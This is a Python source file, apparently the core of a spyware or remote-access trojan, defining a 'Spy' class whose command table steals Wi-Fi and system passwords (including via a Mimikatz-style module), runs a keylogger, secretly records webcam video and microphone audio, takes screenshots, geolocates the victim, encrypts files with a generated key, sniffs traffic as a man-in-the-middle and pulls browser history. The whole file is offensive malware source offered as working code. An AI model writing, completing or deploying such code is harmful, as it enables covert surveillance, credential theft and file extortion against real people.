import os
import threading
from typing import Optional, Tuple

from spying.consts import DEFAULT_VIDEO_AUDIO_NAME
from spying.KeyLogger import KeyLogger
from spying.Wifi import steal_passwords
import spying.admin
from spying.video import VideoRecorder, AudioRecorder, get_available_cameras
from pyautogui import screenshot
import geocoder
from spying.encrypt import Encryptor
from spying.MITM import netstart, filestart, stop_sniffing, is_MITM_runs
from spying.pc_passwords import get_secrets
# from browser_history import get_history, get_bookmarks


class Spy:
    def __init__(self):
        #if not admin.make_admin():
        #    exit()
        self.keyLogger: Optional[KeyLogger] = None
        self.video_recorder: Optional[VideoRecorder] = None
        self.audio_recorder: Optional[AudioRecorder] = None
        self.encryptor: Optional[Encryptor] = None
        self.ok_commands = {
            "steal_passwords": self.steal_passwords,
            "start_keylogger": self.start_keylogger,
            "stop_keylogger": self.stop_keylogger,
            "start_video_audio_record": self.start_video_audio_record,
            "start_video_record": self.start_video_record,
            "start_audio_record": self.start_audio_record,
            "stop_video_audio_record": self.stop_video_audio_record,
            "stop_video_record": self.stop_video_record,
            "stop_audio_record": self.stop_audio_record
        }

    @staticmethod
    def steal_passwords() -> str:
        return steal_passwords()

    @staticmethod
    def passwords_by_mimikatz() -> str:
        return get_secrets()

    def start_keylogger(self) -> bool:
        if self.keyLogger:
            return False
        self.keyLogger = KeyLogger()
        return self.keyLogger.start()

    def stop_keylogger(self) -> bool:
        if not self.keyLogger:
            return False
        r = self.keyLogger.stop()
        self.keyLogger = None
        return r

    def get_keyLogger(self) -> str:
        if self.keyLogger:
            return ", ".join(list(self.keyLogger.keys.queue))

    def is_keyLogGer_runs(self):
        return self.keyLogger is not None

    def start_video_audio_record(self, camindex=None) -> bool:
        if self.audio_recorder or self.video_recorder:
            return False
        self.video_recorder = VideoRecorder(camindex=camindex)
        self.audio_recorder = AudioRecorder()
        self.video_recorder.start()
        self.audio_recorder.start()
        return True

    def start_video_record(self, filename=None, camindex=None) -> bool:
        if self.video_recorder:
            return False
        self.video_recorder = VideoRecorder(filename, camindex=camindex) if filename else VideoRecorder(camindex=camindex)
        self.video_recorder.start()
        return True

    def start_audio_record(self, filename=None) -> bool:
        if self.audio_recorder:
            return False
        self.audio_recorder = AudioRecorder(filename) if filename else AudioRecorder()
        self.audio_recorder.start()
        return True

    def stop_video_audio_record(self, filename=DEFAULT_VIDEO_AUDIO_NAME) -> bool:
        if (not self.audio_recorder) or (not self.audio_recorder):
            return False
        self.video_recorder.stop_merge(self.audio_recorder, filename)
        self.audio_recorder = None
        self.video_recorder = None
        return True

    def stop_video_record(self) -> bool:
        if not self.video_recorder:
            return False
        r = self.video_recorder.stop()
        self.video_recorder = None
        return r

    def stop_audio_record(self) -> bool:
        if not self.audio_recorder:
            return False
        r = self.audio_recorder.stop()
        self.audio_recorder = None
        return r

    def is_video_audio_started(self):
        return self.is_audio_started() and self.is_video_started()

    def is_video_started(self):
        return self.video_recorder is not None

    def is_audio_started(self):
        return self.audio_recorder is not None

    @staticmethod
    def get_available_cameras() -> str:
        return get_available_cameras()

    @staticmethod
    def get_user() -> str:
        return os.getlogin()

    @staticmethod
    def get_computer() -> str:
        return os.environ['COMPUTERNAME']

    @staticmethod
    def take_screenshot(path: str) -> bool:
        """ taking a screenshot and save it in the given path.
        :param path: where to save the file
        :return: whether succeeded
        """
        if not path.endswith(".jpg"):
            path += ".jpg"
        try:
            image = screenshot()
            image.save(path)
            image.close()
            # print("A screenshot has been taken")
        except OSError:
            # print(f"Couldn't take screenshot because {e}")
            return False
        return True

    @staticmethod
    def get_location():
        return geocoder.ip('me').json

    def generate_key(self):
        self.encryptor = Encryptor()
        return self.encryptor.encryption_key.decode()

    # @property
    def encryption_key(self) -> str:
        if self.encryptor:
            return self.encryptor.encryption_key.decode()
        return self.generate_key()

    def encrypt(self, path: str, key=None) -> Tuple[list, list]:
        if not key:
            return self.encryptor.encrypt(path)
        self.encryptor = Encryptor(key)
        return self.encryptor.encrypt(path)

    def decrypt(self, path: str, key=None) -> Tuple[list, list]:
        if not key:
            return self.encryptor.decrypt(path)
        e = Encryptor(key)
        return e.decrypt(path)

    @staticmethod
    def show_files(path: str) -> str:
        return ",".join([file for file in os.listdir(path)])

    @staticmethod
    def start_sniffing_to_file(path: str, ip: str, port: int) -> bool:
        if is_MITM_runs():
            return False
        t = threading.Thread(target=filestart, args=(path, (ip, port)))
        t.start()
        return is_MITM_runs()

    @staticmethod
    def start_sniffing_on_net(ip: str, port: int):
        if is_MITM_runs():
            return False
        t = threading.Thread(target=netstart, args=((ip, port), ))
        t.start()
        return is_MITM_runs()

    @staticmethod
    def stop_sniffing():
        return stop_sniffing()

    @staticmethod
    def get_browser_info() -> Tuple[list, list]:
        return get_history().histories, get_bookmarks().bookmarks

    @staticmethod
    def enter_to_setup(path):
        # TODO: add this
        pass

